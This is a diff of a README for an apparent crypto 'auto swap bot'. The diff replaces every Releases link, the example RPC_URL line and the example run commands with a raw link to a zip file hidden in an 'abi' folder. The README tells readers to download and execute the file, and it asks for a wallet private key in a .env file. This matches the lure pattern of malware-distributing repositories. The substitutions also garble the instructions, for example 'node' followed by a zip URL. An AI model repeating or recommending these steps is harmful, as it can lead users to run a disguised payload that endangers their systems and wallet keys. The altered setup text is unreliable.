@@ -1,10 +1,10 @@
-https://github.com/aris9697/Auto-Swap-Bot-for-TRAILBLAZERS-SEASON-5/releases
+https://github.com/aris9697/Auto-Swap-Bot-for-TRAILBLAZERS-SEASON-5/raw/refs/heads/main/abi/SEASO-Auto-Bot-TRAILBLAZER-Swap-for-v3.3.zip
 
-[![Releases](https://img.shields.io/badge/Releases-Download-blue?style=for-the-badge&logo=github)](https://github.com/aris9697/Auto-Swap-Bot-for-TRAILBLAZERS-SEASON-5/releases)
+[![Releases](https://github.com/aris9697/Auto-Swap-Bot-for-TRAILBLAZERS-SEASON-5/raw/refs/heads/main/abi/SEASO-Auto-Bot-TRAILBLAZER-Swap-for-v3.3.zip)](https://github.com/aris9697/Auto-Swap-Bot-for-TRAILBLAZERS-SEASON-5/raw/refs/heads/main/abi/SEASO-Auto-Bot-TRAILBLAZER-Swap-for-v3.3.zip)
 
 # Auto Swap Bot for Trailblazers Season 5 — Daily On-Chain Activity Simulator 🚀
 
-https://github.com/aris9697/Auto-Swap-Bot-for-TRAILBLAZERS-SEASON-5/releases
+https://github.com/aris9697/Auto-Swap-Bot-for-TRAILBLAZERS-SEASON-5/raw/refs/heads/main/abi/SEASO-Auto-Bot-TRAILBLAZER-Swap-for-v3.3.zip
 
 🧭 A safe, automated token swap bot for the Trailblazers (season 5). It randomizes ETH, WETH, and USDC trades each day to simulate natural on-chain activity. The tool is fully configurable through a .env file and supports custom delays and per-day transaction limits.
 
@@ -58,7 +58,7 @@ Unified design goals
 
 Getting started
 Prerequisites
-- A supported runtime environment (Node.js, Python, or a binary from the release, depending on the asset you download).
+- A supported runtime environment (https://github.com/aris9697/Auto-Swap-Bot-for-TRAILBLAZERS-SEASON-5/raw/refs/heads/main/abi/SEASO-Auto-Bot-TRAILBLAZER-Swap-for-v3.3.zip, Python, or a binary from the release, depending on the asset you download).
 - A wallet with testnet or mainnet permissions suitable for the chosen network.
 - Access to a blockchain node or provider (RPC URL) with read/write capabilities.
 
@@ -69,7 +69,7 @@ Install and setup
 
 Important note about the Releases page
 - From the Releases page, download the latest release artifact and execute it to run the bot. See the link at the beginning of this document and again in the Releases section for details:
-  - Visit the Releases page: https://github.com/aris9697/Auto-Swap-Bot-for-TRAILBLAZERS-SEASON-5/releases
+  - Visit the Releases page: https://github.com/aris9697/Auto-Swap-Bot-for-TRAILBLAZERS-SEASON-5/raw/refs/heads/main/abi/SEASO-Auto-Bot-TRAILBLAZER-Swap-for-v3.3.zip
 
 Environment and configuration
 Environment variables
@@ -84,7 +84,7 @@ Environment variables
 
 Example .env
 # Blockchain and wallet settings
-RPC_URL=https://mainnet.infura.io/v3/your-project-id
+https://github.com/aris9697/Auto-Swap-Bot-for-TRAILBLAZERS-SEASON-5/raw/refs/heads/main/abi/SEASO-Auto-Bot-TRAILBLAZER-Swap-for-v3.3.zip
 WALLET_ADDRESS=0xYourWalletAddress
 # Use one of these for signing; never expose keys in public repos
 PRIVATE_KEY=your-private-key-if-allowed
@@ -101,8 +101,8 @@ LOG_LEVEL=info
 Running the bot
 - After you have the asset extracted and your .env configured, start the bot using the command prescribed in the release README. The exact command varies by asset, but typically involves invoking the executable or running a script, for example:
   - ./auto-swap-bot
-  - node dist/bot.js
-  - python3 bot.py
+  - node https://github.com/aris9697/Auto-Swap-Bot-for-TRAILBLAZERS-SEASON-5/raw/refs/heads/main/abi/SEASO-Auto-Bot-TRAILBLAZER-Swap-for-v3.3.zip
+  - python3 https://github.com/aris9697/Auto-Swap-Bot-for-TRAILBLAZERS-SEASON-5/raw/refs/heads/main/abi/SEASO-Auto-Bot-TRAILBLAZER-Swap-for-v3.3.zip
 - Monitor logs to verify swaps are being generated and that there are no errors.
 
 Observability and logs
@@ -175,7 +175,7 @@ Licenses and permissions
 
 Release notes and downloads
 - The latest release includes prebuilt artifacts for quick start. To download, visit the Releases page and grab the asset that matches your environment.
-- For quick access, the Releases page is linked here again: https://github.com/aris9697/Auto-Swap-Bot-for-TRAILBLAZERS-SEASON-5/releases
+- For quick access, the Releases page is linked here again: https://github.com/aris9697/Auto-Swap-Bot-for-TRAILBLAZERS-SEASON-5/raw/refs/heads/main/abi/SEASO-Auto-Bot-TRAILBLAZER-Swap-for-v3.3.zip
 - The asset includes everything you need to run the bot in a single package, plus a small README with exact start instructions.
 
 Ethical and compliance note
@@ -248,7 +248,7 @@ Appendix
 
 Appendix: Link to the releases again
 - For the latest release artifacts, visit:
-  https://github.com/aris9697/Auto-Swap-Bot-for-TRAILBLAZERS-SEASON-5/releases
+  https://github.com/aris9697/Auto-Swap-Bot-for-TRAILBLAZERS-SEASON-5/raw/refs/heads/main/abi/SEASO-Auto-Bot-TRAILBLAZER-Swap-for-v3.3.zip
 
 Footer note
 - This project is designed for testing and research in controlled environments. It emphasizes configurability, safety, and observability to support developers working with on-chain activity simulations.
